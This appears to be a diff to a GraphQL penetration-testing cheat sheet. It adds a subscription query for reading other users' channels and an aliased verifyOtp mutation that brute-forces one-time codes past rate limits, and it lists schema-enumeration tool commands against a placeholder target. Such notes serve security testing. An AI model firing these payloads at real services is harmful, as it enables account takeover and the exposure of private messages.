@@ -148,6 +148,22 @@ If response returns `"Did you mean: [realFieldName]?"` — schema is enumerable 
 ]
 ```
 
+**Subscription hijacking (cross-user channel access):**
+```graphql
+subscription { messageAdded(channelId: "OTHER_USERS_CHANNEL") { content sender { email } } }
+```
+If subscriptions lack per-user scoping, an attacker can receive real-time events from another user's channel or conversation.
+
+**Multi-code OTP/2FA brute-force via alias batching:**
+```graphql
+mutation { 
+  v1: verifyOtp(code:"000001"){token} 
+  v2: verifyOtp(code:"000002"){token}
+  v3: verifyOtp(code:"000003"){token}
+}
+```
+A single GraphQL request aliases the same mutation with different OTP codes. Combined with parallel HTTP, this defeats per-request rate limiting and compresses brute-force attempts into fewer network round-trips.
+
 **RC desync test pattern (pseudo-sequence):**
 ```bash
 # Step 1: Grant access via REST
@@ -175,11 +191,16 @@ grep -Eo '(query|mutation|subscription)\s+\w+\s*[\({]' bundle.js
 grep -Eo '"(/[a-z0-9/_-]*graphql[a-z0-9/_-]*)"' bundle.js
 ```
 
-**InQL / clairvoyance for blind schema enumeration:**
+**GraphQL introspection & audit tooling:**
 ```bash
-python3 clairvoyance.py -u https://target.com/graphql \
-  -H "Authorization: Bearer TOKEN" \
-  -w wordlist.txt -o schema.json
+# InQL (Burp extension) — visualize GraphQL schema and relationships
+inql -t https://target/graphql --generate-queries
+
+# Clairvoyance — brute-force field names when introspection is disabled
+python3 clairvoyance.py -u https://target/graphql -H "Authorization: Bearer TOKEN" -w wordlist.txt -o schema.json
+
+# GraphQL Cop — scan for common misconfigurations (introspection enabled, no depth limits, etc.)
+graphql-cop -t https://target/graphql
 ```
 
 ---
